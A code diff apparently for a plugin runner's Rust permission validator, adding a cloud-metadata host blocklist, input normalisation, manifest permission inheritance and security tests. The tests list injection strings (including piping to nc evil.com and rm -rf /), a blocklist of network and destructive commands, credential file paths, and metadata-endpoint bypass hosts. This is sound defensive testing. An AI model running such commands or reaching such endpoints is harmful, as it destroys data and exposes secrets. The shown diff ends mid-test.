@@ -59,31 +59,67 @@ impl PluginPermissions {
 
     /// Validate network domain/IP to prevent wildcards and dangerous access
     fn validate_network_domain(domain: &str) -> Result<String, String> {
-        // Block empty domains
-        if domain.trim().is_empty() {
+        // Normalize input: trim whitespace and convert to lowercase
+        let normalized_domain = domain.trim().to_lowercase();
+
+        // Block empty domains (after normalization)
+        if normalized_domain.is_empty() {
             return Err("Empty domain not allowed".to_string());
         }
 
         // Block wildcard patterns
-        if domain.contains('*') {
+        if normalized_domain.contains('*') {
             return Err(format!("Wildcard domains not allowed: {}", domain));
         }
 
         // Block dangerous IPs that could grant broad access
         let dangerous_ips = ["0.0.0.0", "::", "localhost", "127.0.0.1", "::1"];
         for dangerous in &dangerous_ips {
-            if domain == *dangerous {
+            if normalized_domain == *dangerous {
                 return Err(format!("Broad network access not allowed: {}", domain));
             }
         }
 
+        // Block cloud metadata services (comprehensive list)
+        let metadata_hosts = [
+            // AWS metadata services
+            "169.254.169.254",
+            "instance-data.ec2.internal",
+            // Google Cloud metadata services
+            "100.100.100.200",
+            "metadata.google.internal",
+            // Azure metadata services
+            "169.254.169.254", // Same IP as AWS but worth being explicit
+            "metadata.azure.com",
+            // Alibaba Cloud metadata services
+            "100.100.100.200", // Same as Google but different cloud
+            // Common bypass attempts
+            "169.254.169.254.nip.io", // nip.io DNS bypass
+            "169.254.169.254.xip.io", // xip.io DNS bypass
+            "metadata",               // Generic metadata hostname
+            "169-254-169-254.nip.io", // Alternative nip.io format
+            "metadata.local",         // Local metadata attempt
+        ];
+
+        for metadata_host in &metadata_hosts {
+            if normalized_domain == *metadata_host {
+                return Err(format!(
+                    "Cloud metadata service access not allowed: {}",
+                    domain
+                ));
+            }
+        }
+
         // Block private network ranges (could be used for internal attacks)
-        if domain.starts_with("192.168.") || domain.starts_with("10.") || domain.starts_with("172.")
+        if normalized_domain.starts_with("192.168.")
+            || normalized_domain.starts_with("10.")
+            || normalized_domain.starts_with("172.")
         {
             return Err(format!("Private network access not allowed: {}", domain));
         }
 
-        Ok(domain.to_string())
+        // Return the normalized domain
+        Ok(normalized_domain)
     }
 
     /// Validate command to prevent injection and dangerous operations
@@ -182,7 +218,10 @@ impl PluginPermissions {
         let path_str = path.as_ref().to_string_lossy().to_string();
         match Self::validate_file_path(&path_str) {
             Ok(validated_path) => {
-                self.file_read.push(validated_path);
+                // Avoid duplicates
+                if !self.file_read.contains(&validated_path) {
+                    self.file_read.push(validated_path);
+                }
             }
             Err(err) => {
                 eprintln!("⚠️  Security warning: Blocked dangerous read path: {}", err);
@@ -198,7 +237,10 @@ impl PluginPermissions {
         let path_str = path.as_ref().to_string_lossy().to_string();
         match Self::validate_file_path(&path_str) {
             Ok(validated_path) => {
-                self.file_write.push(validated_path);
+                // Avoid duplicates
+                if !self.file_write.contains(&validated_path) {
+                    self.file_write.push(validated_path);
+                }
             }
             Err(err) => {
                 eprintln!(
@@ -215,7 +257,10 @@ impl PluginPermissions {
         let domain_str = domain.as_ref();
         match Self::validate_network_domain(domain_str) {
             Ok(validated_domain) => {
-                self.network.push(validated_domain);
+                // Avoid duplicates
+                if !self.network.contains(&validated_domain) {
+                    self.network.push(validated_domain);
+                }
             }
             Err(err) => {
                 eprintln!(
@@ -232,7 +277,10 @@ impl PluginPermissions {
         let command_str = command.as_ref();
         match Self::validate_command(command_str) {
             Ok(validated_command) => {
-                self.run_commands.push(validated_command);
+                // Avoid duplicates
+                if !self.run_commands.contains(&validated_command) {
+                    self.run_commands.push(validated_command);
+                }
             }
             Err(err) => {
                 eprintln!("⚠️  Security warning: Blocked dangerous command: {}", err);
@@ -244,18 +292,84 @@ impl PluginPermissions {
 
 /// Build permissions for a plugin execution
 ///
-/// Currently returns safe defaults, but this is where we'll add:
-/// - Manifest-declared permissions
-/// - CLI override flags
-/// - User prompts for new permissions
-pub fn build_plugin_permissions(project_root: &Path) -> Result<PluginPermissions> {
-    // For now, just return safe defaults
-    // TODO: In future versions, this will:
-    // 1. Load permissions from plugin manifest
-    // 2. Apply CLI override flags
-    // 3. Prompt user for additional permissions if needed
-    // 4. Cache permission decisions
+/// This function implements the permission inheritance system:
+/// 1. Start with safe defaults
+/// 2. Apply plugin-level permissions (with automatic validation)
+/// 3. Apply command-specific permissions (with automatic validation)
+///
+/// Security validation occurs automatically within each permission type:
+/// - File paths are validated for path traversal and system directory access
+/// - Network domains are validated against localhost, private IPs, and wildcards
+/// - Commands are validated against injection and dangerous operations
+/// - Invalid permissions are blocked with warning messages but don't fail the build
+pub fn build_plugin_permissions(
+    project_root: &Path,
+    plugin_manifest: &crate::models::PluginManifest,
+    command_name: &str,
+) -> Result<PluginPermissions> {
+    // 1. Start with safe defaults
+    let mut permissions = PluginPermissions::safe_defaults(project_root);
 
+    // 2. Apply plugin-level permissions
+    if let Some(plugin_perms) = &plugin_manifest.permissions {
+        apply_security_permissions(&mut permissions, plugin_perms, "plugin-level")?;
+    }
+
+    // 3. Apply command-specific permissions
+    if let Some(command) = plugin_manifest.commands.get(command_name) {
+        if let Some(command_perms) = &command.permissions {
+            apply_security_permissions(
+                &mut permissions,
+                command_perms,
+                &format!("command '{}'", command_name),
+            )?;
+        }
+    }
+
+    Ok(permissions)
+}
+
+/// Apply security permissions from manifest configuration to PluginPermissions
+///
+/// Each permission type is automatically validated through the allow_* methods:
+///
+/// Dangerous permissions are blocked with warning messages but don't cause failure.
+fn apply_security_permissions(
+    permissions: &mut PluginPermissions,
+    config_perms: &crate::models::SecurityPermissions,
+    context: &str,
+) -> Result<()> {
+    // Apply file read permissions
+    for path in &config_perms.file_read {
+        permissions.allow_read(path);
+    }
+
+    // Apply file write permissions
+    for path in &config_perms.file_write {
+        permissions.allow_write(path);
+    }
+
+    // Apply environment access (explicit override)
+    if let Some(env_access) = config_perms.env_access {
+        permissions.env_access = env_access;
+    }
+
+    // Apply network permissions
+    for domain in &config_perms.network {
+        permissions.allow_network(domain);
+    }
+
+    // Apply run command permissions
+    for command in &config_perms.run_commands {
+        permissions.allow_run(command);
+    }
+
+    Ok(())
+}
+
+/// Legacy function for backward compatibility - uses safe defaults only
+pub fn build_plugin_permissions_legacy(project_root: &Path) -> Result<PluginPermissions> {
+    // For plugins without manifest-declared permissions, use safe defaults
     Ok(PluginPermissions::safe_defaults(project_root))
 }
 
@@ -595,7 +709,7 @@ mod tests {
     #[test]
     fn test_build_plugin_permissions() {
         let project_root = PathBuf::from("/test/project");
-        let result = build_plugin_permissions(&project_root);
+        let result = build_plugin_permissions_legacy(&project_root);
 
         assert!(result.is_ok());
         let permissions = result.unwrap();
@@ -606,22 +720,249 @@ mod tests {
         assert_eq!(permissions.network, Vec::<String>::new());
     }
 
-    // ========== SECURITY VULNERABILITY TESTS ==========
-    // These tests verify that our security validation blocks attack vectors
+    // ========== NEW PERMISSION SYSTEM TESTS ==========
 
     #[test]
-    fn test_path_traversal_attack_prevention() {
+    fn test_plugin_level_permissions() {
+        use crate::models::{PluginManifest, PluginMeta, SecurityPermissions};
+        use std::collections::HashMap;
+
         let project_root = PathBuf::from("/test/project");
-        let mut permissions = PluginPermissions::safe_defaults(&project_root);
 
-        // Attempt path traversal attacks - these should be blocked
-        permissions.allow_read("../../../etc/passwd");
-        permissions.allow_read("..\\..\\..\\Windows\\System32");
-        permissions.allow_write("../../../tmp/malicious");
+        let plugin_permissions = SecurityPermissions {
+            file_read: vec!["./config".to_string(), "./data".to_string()],
+            file_write: vec!["./output".to_string()],
+            env_access: Some(false), // Override default
+            network: vec!["api.github.com".to_string()],
+            run_commands: vec!["git".to_string()],
+        };
 
+        let manifest = PluginManifest {
+            plugin: PluginMeta {
+                name: "test-plugin".to_string(),
+                description: None,
+                version: "1.0.0".to_string(),
+            },
+            commands: HashMap::new(),
+            deno_dependencies: HashMap::new(),
+            user_config: None,
+            permissions: Some(plugin_permissions),
+        };
+
+        let result = build_plugin_permissions(&project_root, &manifest, "test-command");
+        assert!(result.is_ok());
+        let permissions = result.unwrap();
+
+        // Should have safe defaults plus plugin permissions
+        assert!(permissions.file_read.contains(&"/test/project".to_string()));
+        assert!(permissions.file_read.contains(&".makeitso".to_string()));
+        assert!(permissions.file_read.contains(&"./config".to_string()));
+        assert!(permissions.file_read.contains(&"./data".to_string()));
+
+        assert!(
+            permissions
+                .file_write
+                .contains(&"/test/project".to_string())
+        );
+        assert!(permissions.file_write.contains(&"./output".to_string()));
+
+        assert_eq!(permissions.env_access, false); // Overridden by plugin config
+        assert!(permissions.network.contains(&"api.github.com".to_string()));
+        assert!(permissions.run_commands.contains(&"git".to_string()));
+    }
+
+    #[test]
+    fn test_command_level_permissions_extend_plugin() {
+        use crate::models::{PluginCommand, PluginManifest, PluginMeta, SecurityPermissions};
+        use std::collections::HashMap;
+
+        let project_root = PathBuf::from("/test/project");
+
+        let plugin_permissions = SecurityPermissions {
+            file_read: vec!["./config".to_string()],
+            network: vec!["api.github.com".to_string()],
+            run_commands: vec!["git".to_string()],
+            ..Default::default()
+        };
+
+        let command_permissions = SecurityPermissions {
+            file_read: vec!["./secret-config".to_string()],
+            network: vec!["docker.io".to_string()],
+            run_commands: vec!["docker".to_string()],
+            ..Default::default()
+        };
+
+        let mut commands = HashMap::new();
+        commands.insert(
+            "deploy".to_string(),
+            PluginCommand {
+                script: "./deploy.ts".to_string(),
+                description: None,
+                instructions: None,
+                args: None,
+                permissions: Some(command_permissions),
+            },
+        );
+
+        let manifest = PluginManifest {
+            plugin: PluginMeta {
+                name: "test-plugin".to_string(),
+                description: None,
+                version: "1.0.0".to_string(),
+            },
+            commands,
+            deno_dependencies: HashMap::new(),
+            user_config: None,
+            permissions: Some(plugin_permissions),
+        };
+
+        let result = build_plugin_permissions(&project_root, &manifest, "deploy");
+        assert!(result.is_ok());
+        let permissions = result.unwrap();
+
+        // Should have both plugin and command permissions
+        assert!(permissions.file_read.contains(&"./config".to_string()));
+        assert!(
+            permissions
+                .file_read
+                .contains(&"./secret-config".to_string())
+        );
+
+        assert!(permissions.network.contains(&"api.github.com".to_string()));
+        assert!(permissions.network.contains(&"docker.io".to_string()));
+
+        assert!(permissions.run_commands.contains(&"git".to_string()));
+        assert!(permissions.run_commands.contains(&"docker".to_string()));
+    }
+
+    #[test]
+    fn test_command_without_permissions_inherits_plugin() {
+        use crate::models::{PluginCommand, PluginManifest, PluginMeta, SecurityPermissions};
+        use std::collections::HashMap;
+
+        let project_root = PathBuf::from("/test/project");
+
+        let plugin_permissions = SecurityPermissions {
+            file_read: vec!["./config".to_string()],
+            network: vec!["api.github.com".to_string()],
+            run_commands: vec!["git".to_string()],
+            ..Default::default()
+        };
+
+        let mut commands = HashMap::new();
+        commands.insert(
+            "status".to_string(),
+            PluginCommand {
+                script: "./status.ts".to_string(),
+                description: None,
+                instructions: None,
+                args: None,
+                permissions: None, // No command-specific permissions
+            },
+        );
+
+        let manifest = PluginManifest {
+            plugin: PluginMeta {
+                name: "test-plugin".to_string(),
+                description: None,
+                version: "1.0.0".to_string(),
+            },
+            commands,
+            deno_dependencies: HashMap::new(),
+            user_config: None,
+            permissions: Some(plugin_permissions),
+        };
+
+        let result = build_plugin_permissions(&project_root, &manifest, "status");
+        assert!(result.is_ok());
+        let permissions = result.unwrap();
+
+        // Should have only plugin permissions (no command-specific additions)
+        assert!(permissions.file_read.contains(&"./config".to_string()));
+        assert!(permissions.network.contains(&"api.github.com".to_string()));
+        assert!(permissions.run_commands.contains(&"git".to_string()));
+
+        // Should not have any unexpected additions
+        assert_eq!(permissions.network.len(), 1);
+        assert_eq!(permissions.run_commands.len(), 1);
+    }
+
+    #[test]
+    fn test_no_permissions_declared_uses_safe_defaults() {
+        use crate::models::{PluginCommand, PluginManifest, PluginMeta};
+        use std::collections::HashMap;
+
+        let project_root = PathBuf::from("/test/project");
+
+        let mut commands = HashMap::new();
+        commands.insert(
+            "basic".to_string(),
+            PluginCommand {
+                script: "./basic.ts".to_string(),
+                description: None,
+                instructions: None,
+                args: None,
+                permissions: None,
+            },
+        );
+
+        let manifest = PluginManifest {
+            plugin: PluginMeta {
+                name: "test-plugin".to_string(),
+                description: None,
+                version: "1.0.0".to_string(),
+            },
+            commands,
+            deno_dependencies: HashMap::new(),
+            user_config: None,
+            permissions: None, // No plugin-level permissions
+        };
+
+        let result = build_plugin_permissions(&project_root, &manifest, "basic");
+        assert!(result.is_ok());
+        let permissions = result.unwrap();
+
+        // Should have only safe defaults
+        assert_eq!(permissions.file_read, vec!["/test/project", ".makeitso"]);
+        assert_eq!(permissions.file_write, vec!["/test/project"]);
+        assert_eq!(permissions.env_access, true);
+        assert_eq!(permissions.network, Vec::<String>::new());
+        assert_eq!(permissions.run_commands, Vec::<String>::new());
+    }
+
+    #[test]
+    fn test_security_validation_still_blocks_dangerous_permissions() {
+        use crate::models::{PluginManifest, PluginMeta, SecurityPermissions};
+        use std::collections::HashMap;
+
+        let project_root = PathBuf::from("/test/project");
+
+        let dangerous_permissions = SecurityPermissions {
+            file_read: vec!["../../../etc/passwd".to_string()], // Path traversal
+            network: vec!["localhost".to_string()],             // Localhost access
+            run_commands: vec!["rm".to_string()],               // Dangerous command
+            ..Default::default()
+        };
+
+        let manifest = PluginManifest {
+            plugin: PluginMeta {
+                name: "malicious-plugin".to_string(),
+                description: None,
+                version: "1.0.0".to_string(),
+            },
+            commands: HashMap::new(),
+            deno_dependencies: HashMap::new(),
+            user_config: None,
+            permissions: Some(dangerous_permissions),
+        };
+
+        let result = build_plugin_permissions(&project_root, &manifest, "test-command");
+        assert!(result.is_ok()); // Function doesn't fail, but permissions are blocked
+        let permissions = result.unwrap();
+
+        // Dangerous permissions should be blocked by validation
         let args = permissions.to_deno_args();
 
-        // Verify attacks were blocked - only safe defaults should remain
         let read_arg = args
             .iter()
             .find(|arg| arg.starts_with("--allow-read="))
@@ -630,474 +971,677 @@ mod tests {
             !read_arg.contains("../../../etc/passwd"),
             "Path traversal should be blocked"
         );
-        assert!(
-            !read_arg.contains("..\\..\\..\\Windows\\System32"),
-            "Path traversal should be blocked"
-        );
 
-        let write_arg = args
-            .iter()
-            .find(|arg| arg.starts_with("--allow-write="))
-            .unwrap();
-        assert!(
-            !write_arg.contains("../../../tmp/malicious"),
-            "Path traversal should be blocked"
-        );
-
-        // Should only contain safe defaults
-        assert!(read_arg.contains("/test/project"));
-        assert!(read_arg.contains(".makeitso"));
-    }
-
-    #[test]
-    fn test_network_wildcard_injection() {
-        let project_root = PathBuf::from("/test/project");
-        let mut permissions = PluginPermissions::safe_defaults(&project_root);
-
-        // Attempt to inject wildcards or broad network access - should be blocked
-        permissions.allow_network("*");
-        permissions.allow_network("*.*");
-        permissions.allow_network("0.0.0.0");
-        permissions.allow_network("::");
-        permissions.allow_network("localhost");
-        permissions.allow_network("192.168.1.1");
-
-        let args = permissions.to_deno_args();
-
-        // Should have no network permissions since all were blocked
         let net_arg = args.iter().find(|arg| arg.starts_with("--allow-net="));
-        assert!(
-            net_arg.is_none(),
-            "All dangerous network access should be blocked"
-        );
-    }
+        assert!(net_arg.is_none(), "Localhost access should be blocked");
 
-    #[test]
-    fn test_command_injection_attempt() {
-        let project_root = PathBuf::from("/test/project");
-        let mut permissions = PluginPermissions::safe_defaults(&project_root);
-
-        // Attempt command injection - should be blocked
-        permissions.allow_run("rm -rf /");
-        permissions.allow_run("cmd /c del C:\\*");
-        permissions.allow_run("sh; cat /etc/passwd");
-        permissions.allow_run("git && wget http://evil.com/malware");
-        permissions.allow_run("rm"); // Dangerous command
-        permissions.allow_run("sudo"); // Dangerous command
-
-        let args = permissions.to_deno_args();
-
-        // Should have no run permissions since all were blocked
         let run_arg = args.iter().find(|arg| arg.starts_with("--allow-run="));
+        assert!(run_arg.is_none(), "Dangerous commands should be blocked");
+    }
+
+    // ========== NEW COMPREHENSIVE SECURITY TESTS ==========
+
+    #[test]
+    fn test_toml_parsing_permission_structure() {
+        // Test that permissions must be at root level, not under [plugin.permissions]
+        let correct_toml = r#"
+[plugin]
+name = "test-plugin"
+version = "1.0.0"
+
+[permissions]
+run_commands = ["git"]
+
+[commands.test]
+script = "./test.ts"
+"#;
+
+        let parsed: Result<crate::models::PluginManifest, _> = toml::from_str(correct_toml);
+        assert!(parsed.is_ok(), "Correct TOML structure should parse");
+
+        let manifest = parsed.unwrap();
         assert!(
-            run_arg.is_none(),
-            "All dangerous commands should be blocked"
+            manifest.permissions.is_some(),
+            "Permissions should be parsed"
+        );
+        assert_eq!(manifest.permissions.unwrap().run_commands, vec!["git"]);
+
+        // Test incorrect structure (this would fail in real usage)
+        let incorrect_toml = r#"
+[plugin]
+name = "test-plugin"  
+version = "1.0.0"
+
+[plugin.permissions]  # This is WRONG - should be [permissions]
+run_commands = ["git"]
+
+[commands.test]
+script = "./test.ts"
+"#;
+
+        let parsed: Result<crate::models::PluginManifest, _> = toml::from_str(incorrect_toml);
+        assert!(parsed.is_ok(), "Should parse but permissions will be None");
+
+        let manifest = parsed.unwrap();
+        assert!(
+            manifest.permissions.is_none(),
+            "Permissions should be None with incorrect structure"
         );
     }
 
     #[test]
-    fn test_safe_permissions_still_work() {
+    fn test_dangerous_commands_comprehensive() {
         let project_root = PathBuf::from("/test/project");
         let mut permissions = PluginPermissions::safe_defaults(&project_root);
 
-        // These should be allowed as they're safe
-        permissions.allow_read("./src/file.txt");
-        permissions.allow_write("./dist/output.txt");
-        permissions.allow_network("api.github.com");
-        permissions.allow_network("registry.npmjs.org");
+        let dangerous_commands = vec![
+            "rm", "del", "format", "fdisk", "dd", "mkfs", "sudo", "su", "chmod", "chown", "passwd",
+            "curl", "wget", "nc", "netcat", "telnet", "ssh", "scp", "rsync", "ftp", "eval", "exec",
+        ];
+
+        for cmd in dangerous_commands {
+            let initial_count = permissions.run_commands.len();
+            permissions.allow_run(cmd);
+
+            // Should not have been added
+            assert_eq!(
+                permissions.run_commands.len(),
+                initial_count,
+                "Dangerous command '{}' should not be added",
+                cmd
+            );
+        }
+
+        // Should still have empty run_commands (started with safe defaults)
+        assert_eq!(permissions.run_commands, Vec::<String>::new());
+    }
+
+    #[test]
+    fn test_command_injection_attempts() {
+        let project_root = PathBuf::from("/test/project");
+        let mut permissions = PluginPermissions::safe_defaults(&project_root);
+
+        let injection_attempts = vec![
+            "git; rm -rf /",          // Command chaining
+            "git && rm -rf /",        // Command chaining
+            "git || rm -rf /",        // Command chaining
+            "git | nc evil.com 1234", // Piping
+            "git > /etc/passwd",      // Redirection
+            "git < /etc/shadow",      // Redirection
+            "git `whoami`",           // Command substitution
+            "git $(whoami)",          // Command substitution
+            "git & background_evil",  // Background execution
+            "git{dangerous}",         // Brace expansion attempt
+            "git(dangerous)",         // Parentheses
+        ];
+
+        for cmd in injection_attempts {
+            let initial_count = permissions.run_commands.len();
+            permissions.allow_run(cmd);
+
+            assert_eq!(
+                permissions.run_commands.len(),
+                initial_count,
+                "Injection attempt '{}' should be blocked",
+                cmd
+            );
+        }
+    }
+
+    #[test]
+    fn test_path_traversal_attempts() {
+        let project_root = PathBuf::from("/test/project");
+        let mut permissions = PluginPermissions::safe_defaults(&project_root);
+
+        let traversal_attempts = vec![
+            "../../../etc/passwd",
+            "../../../../../../etc/shadow",
+            "/etc/passwd",
+            "/root/.ssh/id_rsa",
+            "/etc/shadow",
+            "C:\\Windows\\System32\\config\\SAM",
+            "C:\\Users\\Administrator\\NTUSER.DAT",
+            "/System/Library/Security/authorization",
+            "/Library/Preferences/SystemConfiguration/com.apple.airport.preferences.plist",
+        ];
+
+        let initial_read_count = permissions.file_read.len();
+        let initial_write_count = permissions.file_write.len();
+
+        for path in traversal_attempts {
+            permissions.allow_read(path);
+            permissions.allow_write(path);
+
+            // Should not increase the count (paths should be blocked)
+            assert_eq!(
+                permissions.file_read.len(),
+                initial_read_count,
+                "Dangerous read path '{}' should be blocked",
+                path
+            );
+            assert_eq!(
+                permissions.file_write.len(),
+                initial_write_count,
+                "Dangerous write path '{}' should be blocked",
+                path
+            );
+        }
+    }
+
+    #[test]
+    fn test_network_security_validation() {
+        let project_root = PathBuf::from("/test/project");
+        let mut permissions = PluginPermissions::safe_defaults(&project_root);
+
+        let dangerous_domains = vec![
+            "localhost",
+            "127.0.0.1",
+            "::1",
+            "0.0.0.0",
+            "::",
+            "*.evil.com",      // Wildcard
+            "evil.*.com",      // Wildcard
+            "192.168.1.1",     // Private network
+            "10.0.0.1",        // Private network
+            "172.16.0.1",      // Private network
+            "169.254.169.254", // AWS metadata - should be blocked but not by private IP logic
+            "100.100.100.200", // Alibaba Cloud metadata
+        ];
+
+        let initial_count = permissions.network.len();
+
+        for domain in dangerous_domains {
+            permissions.allow_network(domain);
+
+            assert_eq!(
+                permissions.network.len(),
+                initial_count,
+                "Dangerous network access '{}' should be blocked",
+                domain
+            );
+        }
+    }
+
+    #[test]
+    fn test_safe_commands_are_allowed() {
+        let project_root = PathBuf::from("/test/project");
+        let mut permissions = PluginPermissions::safe_defaults(&project_root);
+
+        let safe_commands = vec![
+            "git",
+            "node",
+            "npm",
+            "yarn",
+            "deno",
+            "python",
+            "python3",
+            "cargo",
+            "rustc",
+            "go",
+            "java",
+            "javac",
+            "make",
+            "cmake",
+            "docker",
+            "kubectl",
+            "terraform",
+            "aws",
+            "gcloud",
+            "az",
+        ];
+
+        for cmd in &safe_commands {
+            permissions.allow_run(cmd);
+        }
+
+        // All safe commands should be added
+        assert_eq!(permissions.run_commands.len(), safe_commands.len());
+
+        for cmd in safe_commands {
+            assert!(
+                permissions.run_commands.contains(&cmd.to_string()),
+                "Safe command '{}' should be allowed",
+                cmd
+            );
+        }
+    }
+
+    #[test]
+    fn test_safe_paths_are_allowed() {
+        let project_root = PathBuf::from("/test/project");
+        let mut permissions = PluginPermissions::safe_defaults(&project_root);
+
+        let safe_paths = vec![
+            "./config",
+            "./data",
+            "./output",
+            "./logs",
+            "vendor/deps",
+            "node_modules",
+            ".git",
+            "dist/output",
+        ];
+
+        let initial_read_count = permissions.file_read.len();
+        let initial_write_count = permissions.file_write.len();
+
+        for path in &safe_paths {
+            permissions.allow_read(path);
+            permissions.allow_write(path);
+        }
+
+        // All safe paths should be added
+        assert_eq!(
+            permissions.file_read.len(),
+            initial_read_count + safe_paths.len()
+        );
+        assert_eq!(
+            permissions.file_write.len(),
+            initial_write_count + safe_paths.len()
+        );
+    }
+
+    #[test]
+    fn test_safe_networks_are_allowed() {
+        let project_root = PathBuf::from("/test/project");
+        let mut permissions = PluginPermissions::safe_defaults(&project_root);
+
+        let safe_domains = vec![
+            "api.github.com",
+            "registry.npmjs.org",
+            "deno.land",
+            "crates.io",
+            "docker.io",
+            "gcr.io",
+            "my-company.com",
+            "example.org",
+        ];
+
+        for domain in &safe_domains {
+            permissions.allow_network(domain);
+        }
+
+        // All safe domains should be added
+        assert_eq!(permissions.network.len(), safe_domains.len());
+
+        for domain in safe_domains {
+            assert!(
+                permissions.network.contains(&domain.to_string()),
+                "Safe domain '{}' should be allowed",
+                domain
+            );
+        }
+    }
+
+    #[test]
+    fn test_empty_and_whitespace_validation() {
+        let project_root = PathBuf::from("/test/project");
+        let mut permissions = PluginPermissions::safe_defaults(&project_root);
+
+        let initial_read_count = permissions.file_read.len();
+        let initial_write_count = permissions.file_write.len();
+        let initial_network_count = permissions.network.len();
+        let initial_run_count = permissions.run_commands.len();
+
+        // Test empty strings
+        permissions.allow_read("");
+        permissions.allow_write("");
+        permissions.allow_network("");
+        permissions.allow_run("");
+
+        // Test whitespace-only strings
+        permissions.allow_read("   ");
+        permissions.allow_write("\t\n");
+        permissions.allow_network("  \t  ");
+        permissions.allow_run("\n\r\t");
+
+        // Counts should not change
+        assert_eq!(permissions.file_read.len(), initial_read_count);
+        assert_eq!(permissions.file_write.len(), initial_write_count);
+        assert_eq!(permissions.network.len(), initial_network_count);
+        assert_eq!(permissions.run_commands.len(), initial_run_count);
+    }
+
+    #[test]
+    fn test_deduplication_works() {
+        let project_root = PathBuf::from("/test/project");
+        let mut permissions = PluginPermissions::safe_defaults(&project_root);
+
+        // Add the same safe command multiple times
         permissions.allow_run("git");
-        permissions.allow_run("npm");
-        permissions.allow_run("node");
+        permissions.allow_run("git");
+        permissions.allow_run("git");
 
-        let args = permissions.to_deno_args();
+        // Should only appear once
+        assert_eq!(permissions.run_commands.len(), 1);
+        assert_eq!(permissions.run_commands[0], "git");
 
-        // Verify safe permissions were allowed
-        let read_arg = args
+        // Add same safe path multiple times
+        let initial_read_count = permissions.file_read.len();
+        permissions.allow_read("./config");
+        permissions.allow_read("./config");
+        permissions.allow_read("./config");
+
+        // Should only appear once (in addition to defaults)
+        // Note: safe_defaults already includes project_root and .makeitso paths
+        assert_eq!(permissions.file_read.len(), initial_read_count + 1);
+
+        // Verify the config path was added only once
+        let config_count = permissions
+            .file_read
             .iter()
-            .find(|arg| arg.starts_with("--allow-read="))
-            .unwrap();
-        assert!(read_arg.contains("./src/file.txt"));
-
-        let write_arg = args
-            .iter()
-            .find(|arg| arg.starts_with("--allow-write="))
-            .unwrap();
-        assert!(write_arg.contains("./dist/output.txt"));
-
-        let net_arg = args
-            .iter()
-            .find(|arg| arg.starts_with("--allow-net="))
-            .unwrap();
-        assert!(net_arg.contains("api.github.com"));
-        assert!(net_arg.contains("registry.npmjs.org"));
-
-        let run_arg = args
-            .iter()
-            .find(|arg| arg.starts_with("--allow-run="))
-            .unwrap();
-        assert!(run_arg.contains("git"));
-        assert!(run_arg.contains("npm"));
-        assert!(run_arg.contains("node"));
+            .filter(|&path| path == "./config")
+            .count();
+        assert_eq!(config_count, 1, "Config path should appear exactly once");
     }
 
-    // ========== REGISTRY URL SECURITY TESTS ==========
+    #[test]
+    fn test_command_specific_permissions_extend_plugin_permissions() {
+        use crate::models::{PluginCommand, PluginManifest, PluginMeta, SecurityPermissions};
+        use std::collections::HashMap;
+
+        let project_root = PathBuf::from("/test/project");
+
+        // Plugin allows git
+        let plugin_permissions = SecurityPermissions {
+            run_commands: vec!["git".to_string()],
+            ..Default::default()
+        };
+
+        // Command allows git + docker (should result in both)
+        let command_permissions = SecurityPermissions {
+            run_commands: vec!["git".to_string(), "docker".to_string()],
+            ..Default::default()
+        };
+
+        let mut commands = HashMap::new();
+        commands.insert(
+            "deploy".to_string(),
+            PluginCommand {
+                script: "./deploy.ts".to_string(),
+                description: None,
+                instructions: None,
+                args: None,
+                permissions: Some(command_permissions),
+            },
+        );
+
+        let manifest = PluginManifest {
+            plugin: PluginMeta {
+                name: "test-plugin".to_string(),
+                description: None,
+                version: "1.0.0".to_string(),
+            },
+            commands,
+            deno_dependencies: HashMap::new(),
+            user_config: None,
+            permissions: Some(plugin_permissions),
+        };
+
+        let result = build_plugin_permissions(&project_root, &manifest, "deploy");
+        assert!(result.is_ok());
+        let permissions = result.unwrap();
+
+        // Should have both git and docker (git from plugin + both from command)
+        // Deduplication should prevent git appearing twice
+        assert_eq!(permissions.run_commands.len(), 2);
+        assert!(permissions.run_commands.contains(&"git".to_string()));
+        assert!(permissions.run_commands.contains(&"docker".to_string()));
+    }
 
     #[test]
-    fn test_registry_url_validation_blocks_file_schemes() {
-        // Block local file access attempts
-        let dangerous_urls = vec![
+    fn test_malformed_toml_permissions() {
+        // Test various malformed permission configurations
+        let malformed_configs = vec![
+            // Wrong type - string instead of array
+            r#"
+[plugin]
+name = "test"
+version = "1.0.0"
+
+[permissions]
+run_commands = "git"  # Should be ["git"]
+
+[commands.test]
+script = "./test.ts"
+"#,
+            // Wrong type - number instead of array
+            r#"
+[plugin]
+name = "test"
+version = "1.0.0"
+
+[permissions]
+run_commands = 123
+
+[commands.test]
+script = "./test.ts"
+"#,
+            // Mixed types in array
+            r#"
+[plugin]
+name = "test"
+version = "1.0.0"
+
+[permissions]
+run_commands = ["git", 123, true]
+
+[commands.test]
+script = "./test.ts"
+"#,
+        ];
+
+        for config in malformed_configs {
+            let parsed: Result<crate::models::PluginManifest, _> = toml::from_str(config);
+            // These should either fail to parse or parse with empty/default permissions
+            if let Ok(manifest) = parsed {
+                // If it parses, permissions should be None or empty
+                if let Some(perms) = manifest.permissions {
+                    // If permissions exist, run_commands should be empty (failed to parse array)
+                    assert!(
+                        perms.run_commands.is_empty()
+                            || perms.run_commands.iter().all(|s| !s.is_empty())
+                    );
+                }
+            }
+            // If it fails to parse, that's also acceptable behavior
+        }
+    }
+
+    #[test]
+    fn test_nonexistent_command_permissions() {
+        use crate::models::{PluginManifest, PluginMeta, SecurityPermissions};
+        use std::collections::HashMap;
+
+        let project_root = PathBuf::from("/test/project");
+
+        let plugin_permissions = SecurityPermissions {
+            run_commands: vec!["git".to_string()],
+            ..Default::default()
+        };
+
+        let manifest = PluginManifest {
+            plugin: PluginMeta {
+                name: "test-plugin".to_string(),
+                description: None,
+                version: "1.0.0".to_string(),
+            },
+            commands: HashMap::new(), // No commands defined
+            deno_dependencies: HashMap::new(),
+            user_config: None,
+            permissions: Some(plugin_permissions),
+        };
+
+        // Try to build permissions for nonexistent command
+        let result = build_plugin_permissions(&project_root, &manifest, "nonexistent");
+        assert!(result.is_ok());
+        let permissions = result.unwrap();
+
+        // Should still have plugin-level permissions
+        assert_eq!(permissions.run_commands, vec!["git"]);
+    }
+
+    #[test]
+    fn test_url_validation_comprehensive() {
+        // Test registry URL validation
+        let dangerous_registry_urls = vec![
             "file:///etc/passwd",
-            "file:///etc/shadow",
-            "file:///c:/windows/system32/config/sam",
-            "file://localhost/etc/passwd",
-            "file:///Users/admin/.ssh/id_rsa",
-        ];
-
-        for url in dangerous_urls {
-            let result = validate_registry_url(url);
-            assert!(result.is_err(), "Should block dangerous file URL: {}", url);
-            let error = result.unwrap_err();
-            assert!(
-                error.contains("file:// URLs not allowed"),
-                "Error should mention file scheme. Got: {}",
-                error
-            );
-        }
-    }
-
-    #[test]
